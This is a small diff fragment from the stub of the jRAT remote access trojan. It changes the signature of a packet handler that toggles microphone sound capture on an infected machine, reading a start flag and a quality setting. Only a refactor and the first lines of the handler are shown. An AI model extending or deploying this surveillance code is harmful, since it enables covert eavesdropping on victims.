@@ -7,7 +7,7 @@ import se.jrat.stub.packets.outgoing.Packet58ClientUploadSoundCapture;
 public class Packet84ToggleSoundCapture extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		boolean start = Connection.instance.readBoolean();
 		int quality = Connection.instance.readInt();
 		
